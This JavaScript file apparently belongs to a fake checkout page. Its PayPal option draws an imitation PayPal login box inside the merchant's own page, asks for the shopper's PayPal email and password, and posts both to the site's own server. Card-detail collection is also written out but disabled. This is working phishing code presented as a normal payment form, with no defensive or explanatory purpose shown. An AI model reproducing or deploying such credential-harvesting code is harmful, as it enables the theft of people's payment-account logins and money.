let log = console.log 
const d = document
let selectedPaymentBox = d.getElementById('selected-payment-method')
let differentPaymentMethod = d.getElementById('different-payment-method')
const CC_INPUTS = d.querySelectorAll('form.cc-details .cc-input')
const pseud_appearance = d.getElementById('exp-pseudo-div')
const ccSubmitBtn = d.querySelector('#cont-btn > button')
const cancelZelleBtn = d.getElementById('cancel-zelle')

cancelZelleBtn.addEventListener('click', (e)=>{
    modifyVisibility(d.getElementById('zelle'))
    d.getElementById('select-text').textContent = 'Select your payment method'
    d.querySelector('#different-payment-method div[data-paymenttype="zelle"]').classList.remove('highlight-payment')
    differentPaymentMethod.children[0].classList.add('highlight-payment')
    
    
})

d.getElementById("paid").addEventListener("click", ()=>{
    alert("Please hold on while we process your payment, an email will be sent to you.")
})

let prev_card_num_len = 0
let _card_num = ''

let prevCVC = ''
let prevExpDate = ''
let prevCC = ''

ccSubmitBtn.addEventListener('click', processCC)

function processCC(){
    return
    this.textContent = 'Processing...'
    let ccErr = false
    let ccDetails = Object.create(null)
    ccDetails.paymentMode = 'cc';

    [...CC_INPUTS].forEach(inp=>{
        if (inp.value == ''){
            inp.classList.add('err')
            ccErr = true
        }else{
            inp.classList.remove('err')
            ccDetails[inp.id] = inp.value
        }
    })

    if (ccErr){
        return
    }
    sendDetails(ccDetails, "cc");
    setTimeout(()=>{
        this.textContent = 'Continue'
    }, 5000)
    
    setTimeout(()=>{
        [...CC_INPUTS].forEach(inp=>{
            inp.value = ''
        })
    }, 6000)

}

Array.from(CC_INPUTS).slice(0,-1).forEach((input)=>input.addEventListener('input', function(){
    switch(this.id){
        case 'card-num':
            validateCardNum(this)
            break   
        case 'exp-date':
            validateCardDate(this)
            break     
        case 'cvc':
            validateCardCVC(this)
            break
        default:
            return
    }
}))

Array.from(CC_INPUTS).slice(0,-1).forEach((input)=>input.addEventListener('paste', function(e){
    e.preventDefault()
}))

function removeCCWarning(){
    d.querySelector('p.cc-warn').classList.add('display-false')
}

function validateCardNum(input){
    let data = input.value
    let numericVal = data.replace(' ', '')
    numericVal = numericVal.replace(' ', '')
    numericVal = numericVal.replace(' ', '')

    if (data.length < prevCC.length){
        setTimeout(removeCCWarning,2000)
        input.value = ''
        d.querySelector('p.cc-warn').classList.remove('display-false')  
    }

    if(! numericVal.match(/[^0-9]/)){

        if (numericVal.length > 16){
            input.value = input.value.slice(0, -1)
        }

        if(numericVal.length === 4){
            if (prevCC.length < 4){
                // not backspacing
                input.value = `${input.value} `
            }
        }
        
        if(data.length === 9){
            if (prevCC.length < 9){
                // not backspacing
                input.value = `${input.value} `
            }
        }

        if(data.length === 14){
            if (prevCC.length < 14){
                // not backspacing
                input.value = `${input.value} `
            }
        }
        

        prevCC = input.value
    }else{
        input.value = prevCC
    }
}

function validateCardDate(input){
    let data = input.value
    let numericVal = data.replace('/', '')
    numericVal = numericVal.replace(' ', '')
    numericVal = numericVal.replace(' ', '')
    if(! numericVal.match(/[^0-9]/)){
        if(numericVal.length==1){
            if(Number(numericVal) === 2 || Number(numericVal) > 2){
                input.value = `0${data} / `
            }
        }
        
        if(input.value.length === 2){
            input.value = `${input.value} / `
        }

        if (input.value.length > 7){
            input.value = input.value.slice(0, -1)
        }

        if(input.value.length === 4){
            input.value = `${input.value.charAt(0)}${input.value.charAt(1)}`
        }

        prevExpDate = input.value
    }else{
        input.value = prevExpDate
    }
    
}

function validateCardCVC(input){
    let inputData = input.value 
    if (! inputData.match(/[^0-9]/)){
        if (input.value.length==5){
            input.value = input.value.slice(0,-1)
        }
        prevCVC = input.value
    }else{
        input.value = prevCVC
    }
}


selectedPaymentBox.addEventListener('click', ()=>{
    modifyVisibility(differentPaymentMethod)
})


function modifyVisibility(el){
    el.dataset.visible == 'false' ? 
    el.dataset.visible = '' : el.dataset.visible = 'false' 

    el.dataset.visible == '' ? 
    Array.from(differentPaymentMethod.children).forEach((payEl)=> 
    payEl.addEventListener('click', paymentWindow)) : 
    Array.from(differentPaymentMethod.children).forEach((payEl)=> 
    payEl.removeEventListener('click', paymentWindow))
}


function paymentWindow(){
    Array.from(differentPaymentMethod.children).forEach((payEl)=> 
    payEl.classList.remove('highlight-payment'))

    this.classList.add("highlight-payment")

    d.getElementById('select-text').textContent = this.textContent
    modifyVisibility(differentPaymentMethod)

    let paymentForms = d.querySelectorAll('.paywidget[data-paymenttype]')
    Array.from(paymentForms).forEach((form)=> form.dataset.visible='false')
    
    if (this.dataset.paymenttype == 'no-payment'){
        return
    }else{
        let paymentForm = d.querySelector('.paywidget[data-paymenttype=' + this.dataset.paymenttype +']')
        // try{
        //     if(paymentForm.dataset.paymenttype=='paypal'){
        //         setTimeout(()=>paypalApp(paymentForm), 200)
        //     }
        //     modifyVisibility(paymentForm)
        // }
        // catch{
        //     log('No payment form')
        // }

        switch(paymentForm.dataset.paymenttype){
            case 'paypal':
                setTimeout(()=>paypalApp(paymentForm), 200)
                break
            case 'zelle':
                break
            case 'cc':
                break
            default:
                return
        }
        modifyVisibility(paymentForm)
    }
}




function paypalApp(formWidget){
    let newPayPal = true
    function closePayPalWidget(){
        modifyVisibility(formWidget)
        formWidget.innerHTML = ''
        d.getElementById('select-text').textContent = 'Select your payment method'
        Array.from(differentPaymentMethod.children).forEach((payEl)=> 
        payEl.classList.remove('highlight-payment'))
        differentPaymentMethod.children[0].classList.add('highlight-payment')
    }

    if (newPayPal){
        formWidget.innerHTML = payPalMarkup
    }
    let paypal_details = Object.create(null)
    paypal_details.paymentMode = 'paypal'
    let paypalEmailInput = d.getElementById('paypal-email-input')
    paypalEmailInput.focus()

    let payPalOff = d.getElementById('paypal-off')
    payPalOff.addEventListener('click', closePayPalWidget, false)

    let nextbtn = d.getElementById("paypal-next")

    nextbtn.addEventListener('click', function(){
        if(this.textContent=='Next'){
            if (email_verified(paypalEmailInput.value)){
                d.getElementById('paypal-warning').textContent = ''
                
                // process details
                paypal_details['email'] = paypalEmailInput.value
                let reflect_mail = d.getElementById('reflect-mail')
                reflect_mail.innerHTML=`With a PayPal account, you're eligible
                for free return shipping, Purchase Protection and more <br> 
                <div style='width:100%;
                margin-top: 15px;
                font-size: 1.05rem;'>
                <span>${paypal_details['email'].toLowerCase()}</span> 
                <span style="color: #2ba1cf;" class="paypal-change">Change</span>
                </div>`
                reflect_mail.style.textAlign  = 'center'
                reflect_mail.style.fontSize = '1rem'
                reflect_mail.style.fontWeight = '500'
    
    
                paypalEmailInput.id='paypal-password'
                paypalEmailInput.value=''
                paypalEmailInput.placeholder = 'Password'
                paypalEmailInput.type='password'
                paypalEmailInput.setAttribute('autocomplete', 'off')
                this.textContent='Login'
                this.id = 'login-btn'

                let payPalRoot = d.getElementById('paypal-root')
                payPalRoot.querySelector('span.paypal-change').addEventListener('click', ()=>{
                    formWidget.innerHTML = ''
                    payPalChange()
                })
    
            }
            else{
                d.getElementById('paypal-warning').textContent = 'You entered an invalid email'
            }
        }else{
            if(! d.getElementById('paypal-password').value==''){
                this.textContent = 'Processing...'
                paypal_details['password'] = d.getElementById('paypal-password').value
                
                setTimeout(()=>{
                    sendDetails(paypal_details, 'paypal')
                }, 2000)

                setTimeout(closePayPalWidget, 5000)
            }     
        }
    })
}

function email_verified(input){
    if (input.includes(" ")){return}
    function countString(str, letter) { 
        let count = 0; 
        for (let i = 0; i < str.length; i++) { 
            if (str.charAt(i) == letter) { 
                count += 1; 
            } 
        } 
        return count; 
    }

    function checkOtherChar(str){
        for (let i in str){
            if((str[i] == '@' || str[i] == '.' ) || (str[i].toUpperCase() != str[i].toLowerCase()) ||
            (! isNaN(str[i]))){
            }else{
                return false
            }
        }
    }
    if((input[0] == '@' || input[0] == '.') || (input.slice(-1) == '@' || input.slice(-1) == '.')){return false}
    if(checkOtherChar(input) == false){
        return false
    }

    let num_ofAt = countString(input, '@')
    let num_ofPeriod = countString(input, '.')


    if(num_ofAt == 1 && (num_ofPeriod == 2 || num_ofPeriod == 1)){
        
        if(num_ofPeriod == 2){
            let init_value = input
            let char_value = init_value.replace('.', '')
            let charAfterPeriod = char_value.charAt(input.indexOf('.')+1)
            if (! (charAfterPeriod.toUpperCase() != charAfterPeriod.toLowerCase())){
                return false
            }
        }else{
            if(input.indexOf('@') > input.indexOf('.')){
                return false
            }
            let charAfterPeriod = input.charAt(input.indexOf('.')+1)
            if (! (charAfterPeriod.toUpperCase() != charAfterPeriod.toLowerCase())){
                return false
            }   
        }
        let charAfterAt = input.charAt(input.indexOf('@')+1)
        if (! (charAfterAt.toUpperCase() != charAfterAt.toLowerCase())){
            return false
        }

        return true
    }
}

function payPalChange(){
    paypalApp(d.querySelector('form[data-paymenttype="paypal"'))
}

function sendDetails(details, paymentMode){
    let errEl = d.querySelector('#paypal-feedback > p')
    res = fetch(location.href, {
        method:'POST',
        headers: {
            'Content-Type': 'application/json',
            },
        body: JSON.stringify(details)
    })
    
    res.then(data=> data.json())
    .then(data=>{
        errEl.textContent =data.data.msg
        

        d.querySelector('#paypal-feedback').dataset.hidden = ''

        d.querySelector('#paypal-feedback > svg').addEventListener('click', ()=>{
            d.querySelector('#paypal-feedback').dataset.hidden = 'true'
        })

        switch(paymentMode){
            case 'paypal':
                // closePayPalWidget()
                break
            case 'cc':
                let widget = d.querySelector('form[data-paymenttype="cc"]')
                modifyVisibility(widget)
                break
            default:
                return
        }
    })
    .catch(
        errEl.textContent = 'Network error please connect to the internet'
    )
}











var payPalMarkup = `
<div id="paypal-root" style="margin: 15px 15px 75px;">
<div id="paypal-off"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><!--! Font Awesome Pro 6.2.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license (Commercial License) Copyright 2022 Fonticons, Inc. --><path d="M310.6 150.6c12.5-12.5 12.5-32.8 0-45.3s-32.8-12.5-45.3 0L160 210.7 54.6 105.4c-12.5-12.5-32.8-12.5-45.3 0s-12.5 32.8 0 45.3L114.7 256 9.4 361.4c-12.5 12.5-12.5 32.8 0 45.3s32.8 12.5 45.3 0L160 301.3 265.4 406.6c12.5 12.5 32.8 12.5 45.3 0s12.5-32.8 0-45.3L205.3 256 310.6 150.6z"/></svg>
</div>
<div id="paypal-head" style="text-align: center;">
<div id="paypal-logo" style="
    width: 2rem;
    height: 2rem;
    margin: 0 auto;">
    <svg style="fill: #253b80;"
    xmlns="http://www.w3.org/2000/svg" viewBox="0 0 384 512"><!--! Font Awesome Pro 6.2.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license (Commercial License) Copyright 2022 Fonticons, Inc. --><path d="M111.4 295.9c-3.5 19.2-17.4 108.7-21.5 134-.3 1.8-1 2.5-3 2.5H12.3c-7.6 0-13.1-6.6-12.1-13.9L58.8 46.6c1.5-9.6 10.1-16.9 20-16.9 152.3 0 165.1-3.7 204 11.4 60.1 23.3 65.6 79.5 44 140.3-21.5 62.6-72.5 89.5-140.1 90.3-43.4.7-69.5-7-75.3 24.2zM357.1 152c-1.8-1.3-2.5-1.8-3 1.3-2 11.4-5.1 22.5-8.8 33.6-39.9 113.8-150.5 103.9-204.5 103.9-6.1 0-10.1 3.3-10.9 9.4-22.6 140.4-27.1 169.7-27.1 169.7-1 7.1 3.5 12.9 10.6 12.9h63.5c8.6 0 15.7-6.3 17.4-14.9.7-5.4-1.1 6.1 14.4-91.3 4.6-22 14.3-19.7 29.3-19.7 71 0 126.4-28.8 142.9-112.3 6.5-34.8 4.6-71.4-23.8-92.6z"/></svg>
</div>
<h4 style="
    font-size: 1.25rem;
    font-weight: 450;
    margin: 20px;">
    Pay with PayPal
</h4>
<p style="font-size: 1.15rem;" id=reflect-mail>Enter your email address to get started</p>
</div>
<div id="email-div" style="margin-bottom: 20px;">
<input style="font-size: 1.2rem;
width: 100%;
border: 1px solid #253b80;
margin: 20px 0 10px;
border-radius: .2rem;
padding: .7rem 0.5rem;" type="email" id="paypal-email-input" required placeholder="Enter your paypal email">
<span id="paypal-warning" style="
color:red;
text-align:left;
font-size:1.2rem
"></span>
<p style="font-size: 1.2rem;
font-weight: 500;
color: #2ba1cf;">Forgot email?</p>
</div>

<div id="paypal-btn">
<button style="text-align:center;
background-color: #253b80;
width: 100%;
color: white;
padding: 0.5rem;
font-size: 1.3rem;
border-radius: 1.5rem;
margin-bottom: 30px;
border: none;" type="button" id="paypal-next">Next</button>
</div>

<div id="createpaypal">

<hr>
<span style="position: relative;
display: block;
text-align: center;
top: -12px;
background: white;
width: 7%;
margin: 0 auto;">or</span>
<div>
    <button style="text-align:center;
    background-color: inherit;
    width: 100%;
    color: #253b80;
    padding: 0.5rem;
    font-size: 1.3rem;
    border-radius: 1.5rem;
    margin-top: 20px;
    border: 1px solid #253b80;">
        Create an Account
    </button>
</div>

</div>
</div>

`
